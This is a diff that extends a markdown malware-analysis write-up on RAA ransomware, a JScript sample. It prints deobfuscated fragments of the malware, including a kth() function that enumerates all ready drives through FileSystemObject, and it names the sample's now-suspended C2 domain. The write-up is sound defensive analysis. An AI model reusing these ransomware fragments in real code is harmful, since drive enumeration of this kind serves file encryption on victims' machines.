@@ -433,6 +433,60 @@ return aka;
 
 If we take a look at this fragment a little bit closer, it does not have a lot of sense. Take a look at how **MOSKn** array is used - only its first element is initalised and then, inside do...while() loop, only 0 index is in use (if we follow  **pointer_MOSKn**, its value is always 0).
 
+Because **aka** value changes after first request. I couldn't check what exactly is returned as startwavenow.com domain was already suspended and url does not respond, but I found an information in ReaQta writeup that there were some values used in encrytption phase later - see https://reaqta.com/2016/06/raa-ransomware-delivering-pony/ for more details. 
+
+After **get_HZtSmFNRdJM()** function there's code assigns returned values to an array:
+
+```javascript
+var KrvABjTTXNS = [];
+KrvABjTTXNS = get_HZtSmFNRdJM();
+var VKw = KrvABjTTXNS[0];
+var jOnaTnksWb = KrvABjTTXNS[1];
+```
+
+Next executable fragment of the code contains another array initialization and assignment result of **kth()** function to its first element:
+
+```javascript
+var kAgTDYi = [];
+kAgTDYi[0] = kth();
+```
+
+So let's see now what is going on inside **kth()**:
+
+
+```javascript
+function kth() {
+    var DmYbWSaT, s, n, e, sNaZfrOWc;
+    DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
+    e = new Enumerator(DmYbWSaT.Drives);
+    s = [];
+    RKsqOBz:   for (; !e.atEnd(); e.moveNext()) {
+        sNaZfrOWc = e.item();
+        if (sNaZfrOWc.IsReady) {
+            sNaZfrOWc = sNaZfrOWc += "\\\\";
+            s.push(sNaZfrOWc);
+        } else
+            continue RKsqOBz;
+    }
+    return (s);
+}
+
+```
+    
+At the beginning there's _FileSystemObject_ created. As we can find on MSDN documentation page:
+
+```
+Main object. Contains methods and properties that allow you to 
+create, delete, gain information about, and generally manipulate 
+drives, folders, and files. Many of the methods associated with this 
+object duplicate those in other FSO objects; they are provided for 
+convenience.
+```
+(https://msdn.microsoft.com/en-us/library/95dtkhsz(v=vs.84).aspx)
+
+Then, _Enumerator_ property is instantiated and standard method to detect all drives is used (you can follow similar example on https://msdn.microsoft.com/en-us/library/832c8c0x(v=vs.84).aspx)
+Finally, array contains all drives letters is returned.
+
 
 
 ## Summary
